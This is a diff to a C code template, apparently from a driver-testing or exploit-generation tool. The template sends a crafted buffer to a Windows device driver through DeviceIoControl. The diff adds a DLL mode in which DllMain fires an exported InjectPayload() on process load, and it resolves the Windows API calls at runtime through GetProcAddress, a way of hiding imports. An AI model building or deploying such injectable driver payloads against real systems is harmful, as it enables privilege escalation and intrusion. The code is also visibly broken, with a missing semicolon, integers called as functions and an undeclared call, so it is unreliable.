@@ -5,6 +5,8 @@
  *
  */
 
+ // Change here to 0 to make it a standalone executable
+ #define BUILD_AS_DLL 1
 
 #include <windows.h>
 #include <winioctl.h>
@@ -19,18 +21,67 @@
 uint8_t IrpDataIn[]    = {3:s}
 uint8_t IrpDataOut[]   = {4:s}
 
+HMODULE g_hLoadLibrary = NULL;
+ULONG_PTR g_pfnCreateFile = NULL;
+ULONG_PTR g_pfnCloseHandle = NULL;
+ULONG_PTR g_pfnDeviceIoControl = NULL;
+ULONG_PTR g_pfnGetLastError = NULL;
 
+
+#if BUILD_AS_DLL == 1
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
+{{
+    switch (ul_reason_for_call)
+    {{
+    case DLL_PROCESS_ATTACH:
+        InjectPayload()
+        return FALSE;
+
+    case DLL_THREAD_ATTACH:
+    case DLL_PROCESS_DETACH:
+    case DLL_THREAD_DETACH:
+        break;
+	}}
+	return TRUE;
+}}
+
+__declspec(dllexport) DWORD TestInjection() 
+{{
+    wprintf(L"TestInjection() works\n");
+    return ERROR_SUCCESS;
+}}
+#endif
+
+#if BUILD_AS_DLL == 1
+__declspec(dllexport) DWORD InjectPayload()
+#else
 int wmain(int argc, wchar_t** argv)
+#endif
 {{
     HANDLE hDevice = INVALID_HANDLE_VALUE;
     BOOL bResult = FALSE;
     DWORD lpBytesReturned = 0;
 
+    if(!g_hLoadLibrary)
+        g_hLoadLibrary = LoadLibrary(_TEXT("kernel32.dll"));
+
+    if(!g_pfnCreateFile)
+        g_pfnCreateFile = GetProcAddress( g_hLoadLibrary, _TEXT("CreateFileW"));
+
+    if(!g_pfnCloseHandle)
+        g_pfnCloseHandle = GetProcAddress( g_hLoadLibrary, _TEXT("CloseHandle"));
+
+    if(!g_pfnDeviceIoControl)
+        g_pfnDeviceIoControl = GetProcAddress( g_hLoadLibrary, _TEXT("DeviceIoControl"));
+
+    if(!g_pfnGetLastError)
+        g_pfnGetLastError = GetProcAddress( g_hLoadLibrary, _TEXT("GetLastError"));
+
     do
     {{
         wprintf(L"Getting handle for device '%s' with code %#x\n", DRIVER_PATH, IOCTL_CODE);
 
-        hDevice = CreateFile(
+        hDevice = g_pfnCreateFile(
             DRIVER_PATH,
             GENERIC_READ | GENERIC_WRITE,
             FILE_SHARE_READ | FILE_SHARE_WRITE,
@@ -48,7 +99,7 @@ int wmain(int argc, wchar_t** argv)
 
         wprintf(L"Got device %#lx, sending payload\n", hDevice);
 
-        bResult = DeviceIoControl(
+        bResult = g_pfnDeviceIoControl(
             hDevice,
             IOCTL_CODE,
             IrpDataIn,
@@ -70,8 +121,8 @@ int wmain(int argc, wchar_t** argv)
     if(hDevice != INVALID_HANDLE_VALUE)
     {{
         wprintf(L"Closing device %#lx\n", hDevice);
-        CloseHandle(hDevice);
+        g_pfnCloseHandle(hDevice);
     }}
 
-    return bResult;
+    return g_pfnGetLastError();
 }}
